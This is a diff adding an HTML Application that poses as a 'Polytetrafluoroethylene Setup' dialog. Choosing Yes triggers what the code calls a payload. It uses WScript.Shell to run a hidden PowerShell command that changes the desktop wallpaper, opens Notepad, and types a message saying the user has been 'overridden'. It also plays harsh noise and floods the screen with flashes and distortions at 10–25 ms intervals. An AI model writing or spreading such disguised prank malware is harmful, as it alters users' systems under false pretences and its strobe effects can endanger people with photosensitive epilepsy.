@@ -1,0 +1,329 @@
+<html>
+<head>
+<title>Polytetrafluoroethylene</title>
+<hta:application 
+    applicationname="Polytetrafluoroethylene" 
+    border="none" 
+    innerborder="no" 
+    scroll="no" 
+    sysmenu="no" 
+    singleinstance="yes">
+<style>
+    body { 
+        background-color: #000; 
+        color: #0ff; 
+        text-align: center; 
+        font-family: monospace; 
+        margin: 0; 
+        height: 100vh; 
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        overflow: hidden;
+    }
+    
+    /* Startup prompt box style */
+    #promptBox {
+        background-color: #f0f0f0;
+        color: #000;
+        border: 2px solid #999;
+        padding: 20px;
+        width: 380px;
+        box-shadow: 5px 5px 15px rgba(0,0,0,0.5);
+        text-align: left;
+        z-index: 100;
+    }
+    #promptBox h3 { margin-top: 0; font-size: 14px; }
+    #promptBox p { font-size: 13px; }
+    .buttons { text-align: right; margin-top: 20px; }
+    .buttons button { padding: 5px 15px; margin-left: 5px; font-weight: bold; cursor: pointer; }
+
+    /* Payload container with cursor hidden */
+    #payloadContainer {
+        display: none;
+        background-color: black;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        overflow: hidden;
+        cursor: none;
+        user-select: none;
+    }
+
+    h1 { 
+        position: absolute; 
+        top: 35%; 
+        width: 100%; 
+        font-size: 14vw; 
+        color: red; 
+        animation: glitchText 0.02s infinite; 
+        z-index: 40;
+        text-shadow: 4px 4px 0 lime, -4px -4px 0 cyan, 0 0 20px red;
+    }
+    
+    #creepyImage {
+        position: absolute;
+        width: 500px;
+        height: auto;
+        display: none;
+        z-index: 35;
+        pointer-events: none;
+    }
+
+    /* Hyper-speed duplicate trailing cursors style */
+    .fake-cursor {
+        position: absolute;
+        width: 25px;
+        height: auto;
+        pointer-events: none;
+        z-index: 9999;
+        filter: invert(1) contrast(300%);
+    }
+
+    /* Container for hyper-speed line spam */
+    #lineSpamLayer {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 10;
+        pointer-events: none;
+        filter: blur(0.5px);
+    }
+
+    /* Container for aggressive red X spam flood */
+    #errorSpamLayer {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 30;
+        pointer-events: none;
+        overflow: hidden;
+    }
+
+    /* Style for hyper-aggressive spamming red X characters */
+    .spam-red-x {
+        position: absolute;
+        font-family: Arial, sans-serif;
+        font-weight: 900;
+        color: red;
+        text-shadow: 0 0 10px red, 0 0 20px #ff0000, 2px 2px 0 #fff;
+        user-select: none;
+    }
+
+    @keyframes glitchText {
+        0% { transform: translate(0, 0) scale(1); color: red; }
+        20% { transform: translate(-25px, 15px) scale(1.1); color: lime; }
+        40% { transform: translate(20px, -15px) scale(0.9); color: cyan; }
+        60% { transform: translate(-15px, -20px) scale(1.05); color: yellow; }
+        80% { transform: translate(25px, 15px) scale(0.95); color: magenta; }
+        100% { transform: translate(0, 0) scale(1); color: red; }
+    }
+</style>
+<script>
+    let mouseX = 0;
+    let mouseY = 0;
+    let audioCtx;
+    let globalT = 0;
+
+    document.onmousemove = function(e) {
+        mouseX = e.clientX;
+        mouseY = e.clientY;
+    };
+
+    function triggerPayload() {
+        document.getElementById("promptBox").style.display = "none";
+        document.getElementById("payloadContainer").style.display = "block";
+
+        try {
+            var shell = new ActiveXObject("WScript.Shell");
+            var path = unescape(location.pathname).replace(/^\//, '').replace(/\//g, '\\');
+            var folder = path.substring(0, path.lastIndexOf('\\') + 1);
+            var imgPath = folder + "wallpaper.jpg";
+            
+            var psCommand = "powershell -WindowStyle Hidden -Command \"(('[System.Runtime.InteropServices.DllFunctionAttribute]' -as [type]); Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\\\"user32.dll\\\", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '" + imgPath + "', 3)\"";
+            shell.Run(psCommand, 0, false);
+
+            shell.Run("notepad.exe", 1, false);
+            ShellWait(shell, 50);
+            shell.SendKeys("YOU HAVE BEEN COMPLETELY OVERRIDDEN BY POLYTETRAFLUOROETHYLENE.EXE");
+        } catch(e) {}
+
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        audioCtx.resume();
+        playBytebeatLoop();
+
+        // Launch hyper-aggressive effect loops
+        loopLineSpam();
+        loopRedXSpam();
+        loopScreenIntenseBlur();
+        flashCreepyImages();
+        loopCursors();
+    }
+
+    function ShellWait(shell, ms) {
+        try { shell.Run("ping -n 1 -w " + ms + " 127.0.0.1", 0, true); } catch(e) {}
+    }
+
+    function cancelPayload() {
+        window.close();
+    }
+
+    // Super Intense Glitch Audio Engine (20s interval switching)
+    function playBytebeatLoop() {
+        const sampleRate = 8000;
+        const duration = 2; 
+        const frameCount = sampleRate * duration;
+        const myArrayBuffer = audioCtx.createBuffer(1, frameCount, sampleRate);
+        const nowBuffering = myArrayBuffer.getChannelData(0);
+        
+        for (let i = 0; i < frameCount; i++) {
+            let t = globalT++;
+            let wave = ((t / 160000 | 0) % 3 === 0) ? 
+                (((t * (t >> 9 | t >> 13)) & 127) ^ ((t & t >> 13) * 12)) : 
+                ((t / 160000 | 0) % 3 === 1) ? 
+                ((t * ((t >> 12 | t >> 8) & 63) & 128) ^ (t >> 3)) : 
+                (((t * (t >> 3 | t >> 5)) & 255) ^ (t * (t >> 9) & 127));
+
+            nowBuffering[i] = ((wave & 255) / 128) - 1;
+        }
+
+        const source = audioCtx.createBufferSource();
+        source.buffer = myArrayBuffer;
+        source.connect(audioCtx.destination);
+        source.onended = playBytebeatLoop; 
+        source.start();
+    }
+
+    // Ultra-fast line spam (flashing every 15ms)
+    function loopLineSpam() {
+        const container = document.getElementById("lineSpamLayer");
+        let linesHtml = "";
+        const numLines = 35 + Math.floor(Math.random() * 20);
+        const screenHeight = window.innerHeight;
+
+        for(let i = 0; i < numLines; i++) {
+            const topPos = Math.random() * screenHeight;
+            const thickness = 1 + Math.random() * 8;
+            const colors = ["lime", "red", "cyan", "black", "magenta", "white"];
+            const color = colors[Math.floor(Math.random() * colors.length)];
+            linesHtml += "<div style='position:absolute; top:"+topPos+"px; left:0; width:100%; height:"+thickness+"px; background-color:"+color+"; opacity:"+(Math.random()*0.8+0.2)+";'></div>";
+        }
+        container.innerHTML = linesHtml;
+        setTimeout(loopLineSpam, 15); 
+    }
+
+    // Maximum aggression red X spam flood (refreshes every 25ms)
+    function loopRedXSpam() {
+        const container = document.getElementById("errorSpamLayer");
+        let xHtml = "";
+        const numX = 25 + Math.floor(Math.random() * 20);
+        const screenWidth = window.innerWidth - 100;
+        const screenHeight = window.innerHeight - 100;
+
+        for(let i = 0; i < numX; i++) {
+            const posX = Math.random() * screenWidth;
+            const posY = Math.random() * screenHeight;
+            const fontSize = 30 + Math.floor(Math.random() * 70);
+            const rotation = Math.floor(Math.random() * 360);
+            
+            xHtml += "<div class='spam-red-x' style='top:"+posY+"px; left:"+posX+"px; font-size:"+fontSize+"px; transform: rotate("+rotation+"deg); z-index:"+(Math.floor(Math.random()*100))+";'>X</div>";
+        }
+        container.innerHTML = xHtml;
+        setTimeout(loopRedXSpam, 25); 
+    }
+
+    // Hyper-intense screen blur, zoom, and color distortion
+    function loopScreenIntenseBlur() {
+        const container = document.getElementById("payloadContainer");
+        const randomX = (Math.random() - 0.5) * 100;
+        const randomY = (Math.random() - 0.5) * 100;
+        const randomScale = 0.85 + Math.random() * 0.3;
+        const randomRotate = (Math.random() - 0.5) * 20;
+        const randomSkewX = (Math.random() - 0.5) * 50;
+        
+        const blurAmount = Math.random() * 25 + 5;
+        const hueRotate = Math.floor(Math.random() * 360);
+        const contrast = Math.random() * 300 + 150;
+        const saturate = Math.random() * 500 + 100;
+
+        container.style.transform = "translate(" + randomX + "px, " + randomY + "px) scale(" + randomScale + ") rotate(" + randomRotate + "deg) skewX(" + randomSkewX + "deg)";
+        container.style.filter = "blur(" + blurAmount + "px) hue-rotate(" + hueRotate + "deg) contrast(" + contrast + "%) saturate(" + saturate + "%)";
+        
+        setTimeout(loopScreenIntenseBlur, 20); 
+    }
+
+    // Rapid blinding image flashes
+    function flashCreepyImages() {
+        const img = document.getElementById("creepyImage");
+        const randomX = Math.random() * (window.innerWidth - 500);
+        const randomY = Math.random() * (window.innerHeight - 500);
+        img.style.left = randomX + "px";
+        img.style.top = randomY + "px";
+        img.style.filter = "hue-rotate(" + Math.floor(Math.random() * 360) + "deg) invert(1) contrast(400%)";
+
+        img.style.display = "block";
+        setTimeout(function() {
+            img.style.display = "none";
+        }, 50);
+
+        setTimeout(flashCreepyImages, Math.random() * 800 + 200);
+    }
+
+    // Wildly spinning multiple cursor trails
+    let angle = 0;
+    function loopCursors() {
+        angle += 0.3;
+        document.getElementById("c1").style.left = (mouseX + Math.sin(angle) * 60) + "px";
+        document.getElementById("c1").style.top = (mouseY + Math.cos(angle) * 60) + "px";
+        document.getElementById("c2").style.left = (mouseX - Math.cos(angle * 0.7) * 90) + "px";
+        document.getElementById("c2").style.top = (mouseY + Math.sin(angle * 0.7) * 90) + "px";
+        document.getElementById("c3").style.left = (mouseX + (Math.random() * 120 - 60)) + "px";
+        document.getElementById("c3").style.top = (mouseY + (Math.random() * 120 - 60)) + "px";
+        document.getElementById("c4").style.left = (mouseX - Math.sin(angle * 1.5) * 80) + "px";
+        document.getElementById("c4").style.top = (mouseY - Math.cos(angle * 1.5) * 80) + "px";
+        setTimeout(loopCursors, 10);
+    }
+</script>
+</head>
+<body>
+
+    <!-- Startup Confirmation Box -->
+    <div id="promptBox">
+        <h3>Polytetrafluoroethylene Setup</h3>
+        <p>Do you want to run this application?</p>
+        <div class="buttons">
+            <button onclick="triggerPayload()">Yes</button>
+            <button onclick="cancelPayload()">No</button>
+        </div>
+    </div>
+
+    <!-- Active Payload Container -->
+    <div id="payloadContainer">
+        
+        <!-- Hyper-speed line spam layer -->
+        <div id="lineSpamLayer"></div>
+
+        <!-- Hyper-speed red X spam flood layer -->
+        <div id="errorSpamLayer"></div>
+
+        <!-- Glitching Text -->
+        <h1>RUN</h1>
+        
+        <!-- Flashing Image -->
+        <img id="creepyImage" src="eye.png">
+        
+        <!-- Multiple duplicate trailing cursors -->
+        <img src="cursor.png" class="fake-cursor" id="c1">
+        <img src="cursor.png" class="fake-cursor" id="c2">
+        <img src="cursor.png" class="fake-cursor" id="c3">
+        <img src="cursor.png" class="fake-cursor" id="c4">
+    </div>
+
+</body>
+</html>
